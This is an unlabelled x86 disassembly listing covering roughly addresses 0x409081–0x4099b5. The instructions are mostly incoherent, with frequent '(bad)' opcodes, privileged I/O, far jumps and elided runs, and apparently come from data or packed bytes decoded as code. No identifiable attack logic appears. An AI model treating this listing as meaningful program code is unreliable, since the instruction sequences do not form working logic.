  409081:	or     BYTE PTR [ebp-0x118bb7b],cl
  409087:	call   ebx
  409089:	add    BYTE PTR [ecx+0xa3],ch
	...
  40909b:	add    BYTE PTR [eax],al
  40909d:	add    BYTE PTR [edx+ebp*8],bh
  4090a0:	dec    edi
  4090a1:	push   0xbeef0513
  4090a6:	jecxz  0x409091
  4090a8:	je     0x4090b2
  4090aa:	mov    ebx,0x9cffc0e5
  4090af:	cld    
  4090b0:	cmc    
  4090b1:	lahf   
  4090b2:	pushf  
  4090b3:	out    0xfe,eax
  4090b5:	jne    0x409136
  4090b7:	out    0x74,eax
  4090b9:	or     BYTE PTR [ebx-0x7f],bh
  4090bc:	pushf  
  4090bd:	(bad)  
  4090be:	jl     0x4090a1
  4090c0:	rol    DWORD PTR [ebx+edx*8],0x35
  4090c4:	mov    ch,ah
  4090c6:	push   eax
  4090c7:	loopne 0x4090c4
  4090c9:	push   0xffffffa3
  4090cb:	jle    0x4090ea
  4090cd:	jmp    DWORD PTR [esi+0x7e0de71c]
  4090d3:	out    0xfe,eax
  4090d5:	mov    DWORD PTR [esi-0x18],edx
  4090d8:	addr16 add dl,bh
  4090db:	sub    eax,0x4722be16
  4090e0:	jmp    0x3b3a:0xb235fa40
  4090e7:	cs es jne 0x4090ed
  4090eb:	(bad)  
  4090ec:	dec    edi
  4090ed:	les    ebp,FWORD PTR [ebp-0x11]
  4090f0:	and    eax,0xafe76675
  4090f5:	pop    es
  4090f6:	push   edx
  4090f7:	push   eax
  4090f8:	mov    bh,bh
  4090fa:	push   ebp
  4090fb:	in     eax,0x40
  4090fd:	add    al,0xfa
  4090ff:	pop    eax
  409100:	jp     0x4090ee
	...
  409112:	add    BYTE PTR [eax],al
  409114:	jnp    0x409108
  409116:	dec    esi
  409117:	idiv   DWORD PTR ds:0x3645771f
  40911d:	jle    0x409145
  40911f:	jne    0x40912b
  409121:	das    
  409122:	scas   eax,DWORD PTR es:[edi]
  409123:	or     edx,DWORD PTR [edx]
  409125:	inc    edx
  409126:	mov    bl,0xff
  409128:	sbb    eax,0x7f0f4313
  40912d:	inc    edx
  40912e:	add    eax,DWORD PTR [eax]
  409130:	cli    
  409131:	mov    di,0xfaf7
  409135:	sub    eax,0xe9350003
  40913a:	das    
  40913b:	(bad)  
  40913c:	std    
  40913d:	sub    eax,0xc3fa6a03
  409142:	add    ebp,DWORD PTR [edx-0x6]
  409145:	repz add ecx,DWORD PTR [ebp-0x732b85c9]
  40914c:	jg     0x4090cf
  40914e:	sub    eax,0x24ddcdff
  409153:	jne    0x409117
  409155:	xchg   BYTE PTR [edi-0x4c982d05],ch
  40915b:	push   DWORD PTR [ebp-0x88bbcde]
  409161:	test   BYTE PTR [ebp+0x1],ch
  409164:	cli    
  409165:	add    al,0xe9
  409167:	fwait
  409168:	dec    ebp
  409169:	in     al,dx
  40916a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40916b:	add    edx,DWORD PTR [ebp-0x5ce40767]
  409171:	bound  ecx,QWORD PTR [esi+0x25]
  409174:	sub    cl,BYTE PTR [ecx+ebx*1+0x77]
	...
  409187:	add    BYTE PTR [eax],al
  409189:	add    BYTE PTR [edi+0x18],dh
  40918c:	ss and eax,0x1b9ab475
  409192:	push   ebx
  409193:	bound  ebp,QWORD PTR [esi]
  409195:	and    eax,0x2d198973
  40919a:	pop    ebp
  40919b:	pop    ds
  40919c:	adc    ebp,edx
  40919e:	je     0x4091bf
  4091a0:	push   ss
  4091a1:	ja     0x40921a
  4091a3:	and    al,0x16
  4091a5:	and    eax,0xa690b445
  4091aa:	add    dh,al
  4091ac:	call   0xfe5500d5
  4091b1:	and    al,0x2d
  4091b3:	pop    ds
  4091b4:	je     0x4091ad
  4091b6:	sbb    eax,0x1d248af1
  4091bb:	lea    esp,[edi+ebx*1+0xd]
  4091bf:	pop    ds
  4091c0:	(bad)  
  4091c1:	cdq    
  4091c2:	or     eax,0xbae866a7
  4091c7:	add    al,0xc6
  4091c9:	outs   dx,BYTE PTR ds:[esi]
  4091ca:	or     dl,BYTE PTR [edi]
  4091cc:	mov    esi,0xe498f524
  4091d1:	sbb    ecx,DWORD PTR [eax]
  4091d3:	arpl   WORD PTR [esi-0x6a778cdc],bp
  4091d9:	sub    al,0xdd
  4091db:	push   ds
  4091dc:	adc    eax,DWORD PTR [edx+eiz*2]
  4091df:	mov    edx,edx
  4091e1:	ret    0x1fcd
  4091e4:	push   esp
  4091e5:	xor    ecx,ebp
  4091e7:	push   ds
  4091e8:	xchg   BYTE PTR [edi+eax*2],ah
  4091eb:	adc    DWORD PTR [ecx+0x2c],edx
	...
  4091fd:	add    BYTE PTR [eax],al
  4091ff:	add    BYTE PTR [ebx+0x1e],bl
  409202:	add    BYTE PTR [esi+0x30],dh
  409205:	mov    al,ch
  409207:	jbe    0x4091e7
  409209:	sbb    eax,0x7381e96a
  40920e:	cmp    ebp,DWORD PTR [eax+0x59b51df9]
  409214:	ficomp WORD PTR ds:0xa544eff
  40921a:	call   0xff5eaa44
  40921f:	jo     0x409215
  409221:	inc    eax
  409222:	div    DWORD PTR [esi]
  409224:	push   ss
  409225:	stos   DWORD PTR es:[edi],eax
  409226:	inc    eax
  409228:	fcomp  st(1)
  40922a:	inc    eax
  40922b:	jmp    0x1730ea46
  409230:	push   ds
  409231:	push   ds
  409232:	call   FWORD PTR [ebp+eax*2+0x1e48c126]
  409239:	push   ds
  40923a:	mov    DWORD PTR [ecx+esi*4+0x15],ebp
  40923e:	(bad)  
  40923f:	(bad)  
  409240:	xchg   edx,eax
  409241:	push   ds
  409242:	addr16 adc al,0x22
  409245:	(bad)  
  409248:	xchg   edi,eax
  409249:	adc    al,0xf7
  40924b:	out    0xd9,al
  40924d:	sbb    eax,0x66e1ed75
  409252:	mov    eax,ds:0x858bd9d6
  409257:	mov    ch,0xe1
  409259:	sbb    eax,0x289b6aff
  40925e:	idiv   DWORD PTR [esi+0x30740519]
	...
  409274:	add    BYTE PTR [eax],al
  409276:	jne    0x4092d7
  409278:	in     al,dx
  409279:	mov    dh,0x19
  40927b:	push   ds
  40927c:	add    BYTE PTR ds:0x91bd8286,bl
  409282:	icebp  
  409283:	sbb    eax,0xa665e9ff
  409288:	addr16 stc 
  40928a:	stc    
  40928b:	sub    eax,0x7b7400be
  409290:	pop    es
  409291:	call   0x3f3120
  409296:	and    al,0xbc
  409298:	jmp    0x409291
  40929a:	adc    al,0xe2
  40929c:	(bad)  
  40929d:	jne    0x40924a
  40929f:	jmp    0xe2752de0
  4092a4:	(bad)  
  4092a5:	mov    ch,0x3b
  4092a7:	cli    
  4092a8:	(bad)  
  4092a9:	push   DWORD PTR [esp+edi*2]
  4092ac:	pop    es
  4092ad:	call   0x3f3096
  4092b2:	xor    al,0xbc
  4092b4:	fcomip st,st(7)
  4092b6:	and    al,0xe2
  4092b8:	(bad)  
  4092b9:	mov    ch,0xbf
  4092bb:	stc    
  4092bc:	(bad)  
  4092bd:	call   DWORD PTR [esp+edi*2]
  4092c0:	pop    es
  4092c1:	call   0x3f31ca
  4092c6:	in     al,0xbb
  4092c8:	xlat   BYTE PTR ds:[ebx]
  4092c9:	div    esp
  4092cb:	loope  0x4092cb
  4092cd:	jne    0x40931a
  4092cf:	jmp    0xe2752de0
  4092d4:	(bad)  
  4092d5:	mov    ch,0x7
  4092d7:	cli    
  4092d8:	(bad)  
  4092d9:	inc    DWORD PTR [eax]
	...
  4092eb:	add    BYTE PTR [esp+edi*2],dl
  4092ee:	pop    es
  4092ef:	call   0x3f3208
  4092f4:	xor    al,0xbc
  4092f6:	shl    edi,cl
  4092f8:	and    al,0xe2
  4092fa:	(bad)  
  4092fb:	jne    0x409318
  4092fd:	jmp    0xe2752df2
  409302:	(bad)  
  409303:	mov    ch,0xbf
  409305:	(bad)  
  409306:	(bad)  
  409307:	(bad)  
  409308:	mov    ebx,0x94ff9cfb
  40930d:	out    0xb4,eax
  40930f:	in     al,dx
  409310:	jl     0x4092f9
  409312:	(bad)  
  409313:	call   0x40188b
  409318:	cli    
  409319:	jb     0x409373
  40931b:	call   0xe8631eed
  409320:	xlat   BYTE PTR ds:[ebx]
  409321:	mov    eax,ds:0xd1b5ff21
  409326:	imul   DWORD PTR ds:[ebp-0x7825d56d]
  40932d:	stos   DWORD PTR es:[edi],eax
  40932e:	and    edi,edi
  409330:	addr16 (bad) 
  409332:	sbb    edi,edi
  409334:	xchg   ebp,eax
  409335:	mov    dh,0x51
  409337:	popf   
  409338:	lea    esi,[ebx-0x4c514adf]
  40933e:	and    edi,edi
  409340:	xchg   edx,eax
  409341:	jmp    0xf057:0xdb75ff7f
  409348:	shl    DWORD PTR gs:[ecx],cl
  40934b:	(bad)  
  40934c:	out    dx,eax
  40934d:	cmp    DWORD PTR [edx],esp
  40934f:	jne    0x409351
	...
  409361:	add    dl,dh
  409363:	cmc    
  409364:	or     esi,edi
  409366:	push   ebp
  409367:	sti    
  409368:	and    DWORD PTR [ebp-0xde04b6],esi
  40936e:	push   edx
  40936f:	(bad)  
  409370:	jg     0x409371
  409372:	cmp    eax,0x23f7c803
  409377:	daa    
  409378:	and    edi,edi
  40937a:	sub    eax,0x12fb9713
  40937f:	and    BYTE PTR [ecx+0x46551dff],dh
  409385:	or     al,0xfa
  409387:	ror    BYTE PTR [esp+ebp*8+0x6a206a79],1
  40938e:	cli    
  40938f:	mov    DWORD PTR [eax],0x2b1587ff
  409395:	mov    edx,0x89215a90
  40939a:	aaa    
  40939b:	push   edx
  40939c:	lods   al,BYTE PTR ds:[esi]
  40939d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40939e:	and    ebp,ebp
  4093a0:	add    edi,edi
  4093a2:	daa    
  4093a3:	add    eax,0x53aeae6
  4093a8:	sahf   
  4093a9:	xchg   edi,eax
  4093aa:	cmc    
  4093ab:	sub    al,0xa9
  4093ad:	pop    ds
  4093ae:	lds    ebx,FWORD PTR [ebx]
  4093b0:	add    DWORD PTR [edx+0x1],ebp
  4093b3:	(bad)  
  4093b4:	call   0xe9458f64
  4093b9:	sub    DWORD PTR [ebp+0x542be091],0x19
  4093c0:	outs   dx,BYTE PTR ds:[esi]
  4093c1:	and    DWORD PTR [ebp+0x216491],ebx
	...
  4093d7:	add    BYTE PTR [edi],cl
  4093d9:	or     eax,0x1b704f51
  4093de:	push   esi
  4093df:	dec    ebx
  4093e0:	mov    eax,0x70b6e900
  4093e5:	sub    BYTE PTR [edx+0x48],ch
  4093e8:	jbe    0x40939c
  4093ea:	xchg   ebp,eax
  4093eb:	lods   eax,DWORD PTR ds:[esi]
  4093ec:	ins    DWORD PTR es:[edi],dx
  4093ed:	lods   eax,DWORD PTR ds:[esi]
  4093ee:	or     BYTE PTR [ecx],ah
  4093f0:	out    dx,eax
  4093f1:	or     al,0x41
  4093f3:	mov    cl,0x83
  4093f5:	sbb    esp,DWORD PTR [esi]
  4093f7:	mov    edi,DWORD PTR [edi-0x5a288de8]
  4093fd:	in     al,dx
  4093fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093ff:	add    esi,DWORD PTR [ecx-0x27]
  409402:	lods   al,BYTE PTR ds:[esi]
  409403:	jmp    0x4093bf
  409405:	add    al,0x69
  409407:	loope  0x40943e
  409409:	xchg   edi,eax
  40940a:	xchg   DWORD PTR [ebx+0x3a7df29],ebp
  409410:	int3   
  409411:	sub    al,0x35
  409413:	mov    cl,0x1d
  409415:	sbb    edi,DWORD PTR [ecx]
  409417:	lods   al,BYTE PTR ds:[esi]
  409418:	sbb    eax,0xa50427df
  40941d:	sub    al,0x81
  40941f:	mov    al,0x5
  409421:	sbb    esi,DWORD PTR [ebx]
  409423:	or     eax,0xcec913a
  409428:	enter  0x1291,0xba
  40942c:	aad    0x43
  40942e:	add    BYTE PTR [edi-0x1697e5e6],cl
  409434:	mov    ebp,0x2638ffc5
  409439:	and    BYTE PTR [eax+0x9e],ah
	...
  40944b:	add    BYTE PTR [eax],al
  40944d:	add    BYTE PTR [edx],bl
  40944f:	mov    ch,0x67
  409451:	jmp    0x1febe4f
  409456:	(bad)  
  409458:	inc    eax
  409459:	jmp    0xf1b5afc7
  40945e:	loope  0x4094c7
  409460:	shl    DWORD PTR [esi-0x26],0x2c
  409464:	(bad)  [ebp-0x26]
  409467:	sbb    ebx,ebp
  409469:	call   0xe97e2f31
  40946e:	fs sbb al,0x46
  409471:	push   ebp
  409472:	scas   al,BYTE PTR es:[edi]
  409473:	pop    edx
  409474:	mov    ecx,0xff19da4e
  409479:	cmp    ebp,ebx
  40947b:	fadd   QWORD PTR [esi]
  40947d:	mov    ah,0x7a
  40947f:	sbb    dh,BYTE PTR [ebp+0x35]
  409482:	sbb    dl,BYTE PTR [eax+0x7c444107]
  409488:	jmp    DWORD PTR [esi]
  40948a:	cmp    bh,BYTE PTR [eax+0x4f52bc8]
  409490:	push   ebp
  409491:	bound  edx,QWORD PTR ds:0x1a0dc486
  409497:	nop
  409498:	or     eax,DWORD PTR [esi]
  40949a:	mov    WORD PTR [edx],es
  40949c:	call   0xff5a4766
  4094a1:	pusha  
  4094a2:	cmp    al,0x1e
  4094a4:	push   DWORD PTR [ebp+edi*8+0x19]
  4094a8:	jne    0x40949b
  4094aa:	loope  0x40951c
  4094ac:	xchg   esp,eax
  4094ad:	fsubp  st(5),st
  4094af:	lea    ecx,[ebp-0x1b]
	...
  4094c2:	add    BYTE PTR [eax],al
  4094c4:	lock inc esp
  4094c6:	je     0x4094f3
  4094c8:	jns    0x4094a6
  4094ca:	(bad)  
  4094cb:	push   DWORD PTR [edi]
  4094cd:	and    al,0xfe
  4094cf:	jne    0x409480
  4094d1:	call   0xf9ed316a
  4094d6:	dec    edi
  4094d7:	jmp    DWORD PTR [esi]
  4094d9:	cmc    
  4094da:	(bad)  
  4094db:	jne    0x40947c
  4094dd:	push   eax
  4094de:	(bad)  
  4094df:	jne    0x4094ac
  4094e1:	in     eax,dx
  4094e2:	retf   
  4094e3:	xchg   esi,eax
  4094e4:	ins    BYTE PTR es:[edi],dx
  4094e5:	stc    
  4094e6:	pop    ecx
  4094e7:	mov    ebx,esi
  4094e9:	hlt    
  4094ea:	cmp    BYTE PTR [ecx],0xa3
  4094ed:	jl     0x4094f8
  4094ef:	push   edx
  4094f0:	mov    ebx,DWORD PTR [ecx-0x65]
  4094f3:	jmp    FWORD PTR [esi+ebp*1]
  4094f6:	mov    edi,0x7d86c7eb
  4094fb:	adc    BYTE PTR [ebx+0x568b0771],ah
  409501:	adc    eax,0x8a2f75fe
  409506:	add    BYTE PTR [ebx+0x2b01edd1],cl
  40950c:	and    ecx,eax
  40950e:	ror    DWORD PTR [ebx+eiz*2],0x5c
  409512:	mov    ch,ah
  409514:	sub    al,0x7c
  409516:	or     edi,edi
  409518:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409519:	or     eax,0xf9d5b9e8
  40951e:	(bad)  
  40951f:	jmp    DWORD PTR [esi+0x9]
  409522:	push   eax
  409523:	jmp    DWORD PTR [esi+0xd]
  409526:	call   0x40955c
	...
  409537:	add    BYTE PTR [eax],al
  409539:	add    ah,al
  40953b:	stc    
  40953c:	dec    cl
  40953e:	loope  0x409548
  409540:	add    BYTE PTR [ebp-0x58],dl
  409543:	aam    0x82
  409545:	(bad)  
  409546:	rcl    DWORD PTR [edx+0x56],cl
  409549:	push   ebx
  40954a:	nop
  40954b:	arpl   WORD PTR [edi],ax
  40954d:	add    BYTE PTR [edi+0x1f7d8216],dh
  409553:	add    eax,0xaefa0c74
  409558:	lahf   
  409559:	psubd  mm5,QWORD PTR [edi+0x3a778305]
  409560:	add    esi,DWORD PTR [ebp+0x3]
  409563:	repz inc ebx
  409565:	pop    ebx
  409566:	inc    ebp
  409567:	lock dec esp
  409569:	ret    0x2e0a
  40956c:	mov    al,BYTE PTR [ebp+0x6]
  40956f:	stos   DWORD PTR es:[edi],eax
  409570:	and    al,BYTE PTR [edi]
  409572:	jns    0x40956d
  409574:	str    WORD PTR [esi+0x2a]
  409578:	or     al,al
  40957a:	inc    esi
  40957b:	and    eax,0xdf51bfea
  409580:	mov    ebp,0x33eb8c8
  409585:	mov    edi,DWORD PTR [edi]
  409587:	cmp    al,BYTE PTR [edx-0x60550a20]
  40958d:	adc    edi,edx
  40958f:	cmp    DWORD PTR [edi],eax
  409591:	or     edi,DWORD PTR [edx-0x45d4f3ce]
  409597:	push   ebx
  409598:	mov    esi,0xf2ecb35d
  40959d:	inc    DWORD PTR [eax]
	...
  4095af:	add    BYTE PTR [eax],ah
  4095b1:	jecxz  0x4095d0
  4095b3:	jne    0x4095b3
  4095b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095b6:	(bad)  
  4095b7:	mov    edi,0xb436979
  4095bc:	pop    ebp
  4095bd:	push   ecx
  4095be:	inc    ebx
  4095bf:	call   0xff5f190a
  4095c4:	dec    esi
  4095c5:	xchg   ebp,eax
  4095c6:	mov    ebx,0xbe477171
  4095cc:	lock dec ecx
  4095ce:	(bad)  
  4095cf:	push   DWORD PTR [edx+0x13]
  4095d2:	add    eax,DWORD PTR [eax]
  4095d4:	cli    
  4095d5:	sbb    ah,BYTE PTR [esi-0x75]
  4095d8:	scas   eax,DWORD PTR es:[edi]
  4095d9:	and    eax,0x1aee4d8a
  4095de:	lea    di,[edi+0xcb4d904]
  4095e5:	xchg   edx,eax
  4095e6:	test   al,0x1d
  4095e8:	pop    DWORD PTR [eax-0x3f]
  4095eb:	inc    esp
  4095ec:	push   edi
  4095ed:	sbb    dh,cl
  4095ef:	sbb    eax,0x81d1416f
  4095f4:	xchg   ecx,eax
  4095f5:	pop    ss
  4095f6:	mov    esi,0x66096f1d
  4095fb:	(bad)  
  4095fc:	popf   
  4095fd:	and    DWORD PTR [esp+eax*2],0xfffffff1
  409601:	pop    ss
  409602:	sbb    al,0x44
  409604:	loop   0x409592
  409606:	sbb    BYTE PTR ds:0x482c8dc5,0xbe
  40960d:	lea    esp,[eax+ecx*2]
  409610:	xchg   DWORD PTR [ecx+0x8978],edx
	...
  409626:	das    
  409627:	inc    ecx
  409628:	inc    eax
  409629:	hlt    
  40962a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40962b:	pop    ss
  40962c:	jmp    0xe396ec41
  409631:	fistp  QWORD PTR [edx]
  409633:	add    eax,0x4fa09a0
  409638:	jmp    0xdccbf44d
  40963d:	or     esi,DWORD PTR [ecx-0x37]
  409640:	fcom   QWORD PTR [eax]
  409642:	sahf   
  409643:	mov    DWORD PTR [ebx+eiz*1+0x43b417ca],ebp
  40964a:	gs xchg ecx,eax
  40964c:	sub    al,0x2c
  40964e:	int    0x61
  409650:	cs sbb eax,0x2c2c9155
  409656:	or     BYTE PTR [esi+ebx*1+0x1d],bh
  40965a:	inc    esi
  40965b:	mov    DWORD PTR [ebx+edx*1+0x5b20996f],ebx
  409662:	or     al,BYTE PTR ds:0x602903e9
  409668:	ins    BYTE PTR es:[edi],dx
  409669:	xchg   edi,eax
  40966a:	inc    ebp
  40966b:	pop    ebp
  40966c:	add    cl,ah
  40966e:	stc    
  40966f:	add    al,0x0
  409671:	cli    
  409672:	popf   
  409673:	stos   BYTE PTR es:[edi],al
  409674:	add    BYTE PTR [esp+esi*1+0x3f],dh
  409678:	push   eax
  409679:	rcl    ebx,1
  40967b:	mov    BYTE PTR [eax],al
  40967d:	jmp    0x625027f4
  409682:	xchg   esp,eax
  409683:	repnz rcl dh,0xfa
  409687:	or     edi,edi
  409689:	xor    eax,0x0
	...
  40969a:	add    BYTE PTR [eax],al
  40969c:	lahf   
  40969d:	sub    ecx,DWORD PTR [edi]
  40969f:	fs mov ah,0x1e
  4096a2:	push   eax
  4096a3:	pop    ss
  4096a4:	mov    WORD PTR [esi],ds
  4096a6:	jnp    0x40971e
  4096a8:	stc    
  4096a9:	add    al,0x83
  4096ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4096ac:	icebp  
  4096ad:	lds    ecx,FWORD PTR [edx]
  4096af:	xchg   esi,eax
  4096b0:	sub    DWORD PTR fs:[edi],ecx
  4096b3:	push   edi
  4096b4:	mov    edi,0x1818317
  4096b9:	mov    es,WORD PTR [ecx]
  4096bb:	ror    BYTE PTR [ecx],cl
  4096bd:	jmp    0xe96a:0x26e8d974
  4096c4:	arpl   WORD PTR [esi],dx
  4096c6:	imul   ebp,ecx,0x5e551663
  4096cc:	ins    BYTE PTR es:[edi],dx
  4096cd:	push   es
  4096ce:	push   0xffffffe9
  4096d0:	push   ebx
  4096d1:	push   ss
  4096d2:	out    0xf,eax
  4096d4:	stos   BYTE PTR es:[edi],al
  4096d5:	push   ss
  4096d6:	push   edx
  4096d8:	mov    ecx,0xa9992890
  4096dd:	push   ds
  4096de:	aam    0x53
  4096e0:	(bad)  
  4096e1:	adc    eax,0xac90118b
  4096e6:	call   DWORD PTR [edx-0x48ad4c07]
  4096ec:	out    0x8f,al
  4096ee:	jae    0x14041ed
  4096f4:	xor    al,0xaa
  4096f6:	(bad)  
  4096f7:	jmp    DWORD PTR [ebx]
  4096f9:	or     eax,0x552b75c0
  4096fe:	out    0x9d,eax
	...
  409710:	add    BYTE PTR [eax],al
  409712:	leave  
  409713:	clc    
  409714:	(bad)  
  409715:	sub    ebp,eax
  409717:	mov    ebx,es
  409719:	pop    ebx
  40971a:	mov    ah,0x5a
  40971c:	enter  0x3c2,0x2
  409720:	push   ebp
  409721:	mov    esi,DWORD PTR [edi]
  409723:	jle    0x4096e9
  409725:	lock sub al,0x4e
  409728:	sub    bl,bl
  40972a:	mov    ah,0x73
  40972c:	or     edi,edi
  40972e:	cs or  eax,ebp
  409731:	add    DWORD PTR [esi],edi
  409733:	cli    
  409734:	(bad)  
  409735:	push   eax
  409736:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409737:	jae    0x409740
  409739:	call   0x3f2a6b
  40973e:	dec    eax
  40973f:	stc    
  409740:	push   edi
  409741:	add    ebp,DWORD PTR [ebx+0x5]
  409744:	shl    BYTE PTR [esp+ebx*8-0x75],0x45
  409749:	hlt    
  40974a:	adc    edi,edx
  40974c:	je     0x40975a
  40974e:	and    al,0x74
  409750:	pop    es
  409751:	call   0x3f938e
  409756:	sbb    al,BYTE PTR [ebx+edi*8-0x73]
  40975a:	pop    esi
  40975b:	icebp  
  40975c:	dec    edi
  40975d:	jmp    FWORD PTR [esi-0x648a0103]
  409763:	jmp    0xfa059500
  409768:	mov    BYTE PTR [ebp-0x45],al
  40976b:	stc    
  40976c:	je     0x40975e
  40976e:	and    al,0x74
  409770:	idiv   edi
  409772:	sahf   
  409773:	add    eax,0x75ff
	...
  409788:	daa    
  409789:	jmp    0xfa55959e
  40978e:	mov    bl,al
  409790:	in     al,0x73
  409792:	sti    
  409793:	call   0xffbdd792
  409798:	xor    eax,0x22f79106
  40979d:	inc    edi
  40979e:	jge    0x40979f
  4097a0:	and    eax,0x1d570371
  4097a5:	cwde   
  4097a6:	or     ch,al
  4097a8:	bound  edi,QWORD PTR [edx+ebx*1-0x41957e01]
  4097af:	pop    esi
  4097b0:	xor    ebp,DWORD PTR [ecx+0xb]
  4097b3:	add    BYTE PTR [edi+0x778326a2],ah
  4097b9:	xor    al,BYTE PTR [ecx]
  4097bb:	jb     0x4097d8
  4097bd:	dec    ebx
  4097be:	nop
  4097bf:	pmulhw mm3,mm1
  4097c2:	or     ebp,eax
  4097c4:	jnp    0x409778
  4097c6:	sbb    edi,edi
  4097c8:	aad    0xd9
  4097ca:	repz inc BYTE PTR [edi+0x16]
  4097ce:	sub    ebp,DWORD PTR [edi-0xe58c39]
  4097d4:	inc    edi
  4097d5:	push   cs
  4097d6:	sbb    dh,BYTE PTR [ebp+0x2]
  4097d9:	xchg   BYTE PTR [edi-0x3],bl
  4097dc:	lods   eax,DWORD PTR ds:[esi]
  4097dd:	mov    ebx,DWORD PTR [edx]
  4097df:	jne    0x4097eb
  4097e1:	xchg   ebx,eax
  4097e2:	pop    DWORD PTR [edi]
  4097e4:	xchg   edx,eax
  4097e5:	call   0xa7d69704
  4097ea:	scas   eax,DWORD PTR es:[edi]
  4097eb:	adc    eax,DWORD PTR [eax]
	...
  4097fd:	add    BYTE PTR [ebx-0x158ae5e0],al
  409803:	mov    dl,0x8f
  409805:	pop    es
  409806:	xchg   edx,eax
  409807:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409808:	pop    ss
  409809:	push   DWORD PTR [ebp-0x61]
  40980c:	xchg   edi,eax
  40980d:	or     edi,ecx
  40980f:	push   ebx
  409810:	icebp  
  409811:	(bad)  
  409812:	out    dx,eax
  409813:	sub    eax,0xc5f2751a
  409818:	call   0xea75:0x19e355fc
  40981f:	add    al,0x26
  409821:	nop
  409822:	std    
  409823:	sbb    al,0x8c
  409825:	sbb    BYTE PTR ds:0x5901614,bh
  40982b:	lahf   
  40982c:	lock sbb ah,BYTE PTR [edi-0x7191ef04]
  409833:	adc    al,0xfe
  409835:	sbb    DWORD PTR [edi-0x2700a0c],esp
  40983b:	sbb    al,0xcd
  40983d:	outs   dx,DWORD PTR ds:[esi]
  40983e:	or     eax,0xea46b014
  409843:	add    al,0x34
  409845:	lea    ecx,[esi]
  409847:	adc    al,0x5c
  409849:	or     BYTE PTR [eax+0x6],ah
  40984c:	into   
  40984d:	(bad)  
  40984e:	cmc    
  40984f:	sbb    al,0x75
  409851:	jo     0x409838
  409853:	adc    edi,DWORD PTR [esi+0x3c13f18f]
  409859:	or     al,0xe2
  40985b:	sub    ebp,DWORD PTR [edi+0x3c7fcd19]
  409861:	hlt    
	...
  409872:	add    BYTE PTR [eax],al
  409874:	jb     0x40987c
  409876:	sahf   
  409877:	(bad)  
  409878:	icebp  
  409879:	adc    ebx,DWORD PTR [esp+ecx*1]
  40987c:	mov    ds:0xad198f3b,al
  409881:	jg     0x40989f
  409883:	lock jb 0x40988c
  409886:	jle    0x409817
  409888:	icebp  
  409889:	adc    edi,esp
  40988b:	or     esp,DWORD PTR [edx-0x72e690b5]
  409891:	jg     0x40984f
  409893:	sti    
  409894:	jb     0x40989c
  409896:	xor    BYTE PTR [esi-0x1a],al
  409899:	add    al,0xbc
  40989b:	mov    WORD PTR [esi-0x79],fs
  40989e:	and    eax,0x45bbc428
  4098a3:	(bad)
  4098a7:	sbb    bh,ah
  4098a9:	cld    
  4098aa:	inc    DWORD PTR [eax+0x3f]
  4098ad:	ja     0x4098ae
  4098af:	cs repz cdq 
  4098b2:	adc    esp,DWORD PTR [esi]
  4098b4:	jne    0x4098c1
  4098b6:	call   0xff546010
  4098bb:	bound  ecx,QWORD PTR [esi]
  4098bd:	push   ds
  4098be:	cmp    ebp,eax
  4098c0:	stc    
  4098c1:	add    al,0x8b
  4098c3:	lods   al,BYTE PTR ds:[esi]
  4098c4:	adc    eax,0x6ce93886
  4098c9:	or     cl,ch
  4098cb:	mov    edi,0x260004f8
  4098d0:	dec    ebp
  4098d1:	verw   cx
  4098d4:	stc    
  4098d5:	add    al,0x8d
  4098d7:	and    al,0x0
	...
  4098e9:	add    dl,ah
  4098eb:	mov    ah,0xfe
  4098ed:	pop    esp
  4098ee:	jmp    0x798:0x12f97513
  4098f5:	ror    DWORD PTR [edi],1
  4098f7:	adc    edi,edi
  4098f9:	mov    esi,0x34830d6e
  4098fe:	repnz add al,0x74
  409901:	or     bl,BYTE PTR [esi-0x1d7c407]
  409907:	adc    DWORD PTR [ebp-0x63],esi
  40990a:	adc    DWORD PTR [edi+0x6b],edi
  40990d:	jmp    0x1500970b
  409912:	cmc    
  409913:	pushf  
  409914:	sbb    al,0xc5
  409916:	mov    eax,0x5f4fe12
  40991b:	sbb    eax,0x4fe0279
  409920:	mov    DWORD PTR [edx+eiz*8],esp
  409923:	sbb    eax,0x1e442e07
  409928:	add    cl,ch
  40992a:	stc    
  40992b:	add    al,0x83
  40992d:	aam    0x1d
  40992f:	add    eax,0x5a1f174
  409934:	add    BYTE PTR [eax],al
  409936:	int3   
  409937:	stos   DWORD PTR es:[edi],eax
  409938:	(bad)  
  409939:	jne    0x40998a
  40993b:	fiadd  WORD PTR [esi-0x6b]
  40993e:	or     al,0xed
  409940:	(bad)  
  409941:	jne    0x409962
  409943:	in     eax,dx
  409944:	je     0x409952
  409946:	jmp    0x4098d3
  409948:	xchg   esp,eax
  409949:	(bad)  
  40994a:	(bad)  
  40994c:	mov    al,BYTE PTR [eax]
	...
  40995e:	add    BYTE PTR [eax],al
  409960:	and    eax,DWORD PTR [esi]
  409962:	mov    eax,DWORD PTR [ebp+0x27]
  409965:	mov    DWORD PTR [eax],edi
  409967:	add    BYTE PTR [esi+0x1386e812],ah
  40996d:	push   es
  40996e:	add    bh,al
  409970:	data16 out dx,al
  409972:	(bad)  
  409973:	jmp    DWORD PTR [ebx]
  409975:	push   es
  409976:	mov    DWORD PTR [ebp+0x27],0x13000009
  40997d:	rol    DWORD PTR [eax+esi*8-0x1d],cl
  409981:	add    eax,0x444e0000
  409986:	out    dx,eax
  409987:	push   eax
  409988:	outs   dx,BYTE PTR ds:[esi]
  409989:	inc    esp
  40998a:	repz push eax
  40998c:	dec    esi
  40998d:	inc    esp
  40998e:	not    DWORD PTR [eax-0x74]
  409991:	jae    0x4099a6
  409993:	inc    DWORD PTR [esi]
  409995:	add    eax,ebp
  409997:	loope  0x409936
  409999:	stc    
  40999a:	inc    BYTE PTR [ebx+0x73ffdcde]
  4099a0:	rol    BYTE PTR [esi-0x7e5c0783],1
  4099a6:	sub    al,0x83
  4099a8:	(bad)  
  4099a9:	hlt    
  4099aa:	push   DWORD PTR [ebp+edx*4-0x7a]
  4099ae:	jge    0x4099a0
  4099b0:	mov    ds:0x86ff2081,eax
  4099b5:	in     eax,dx
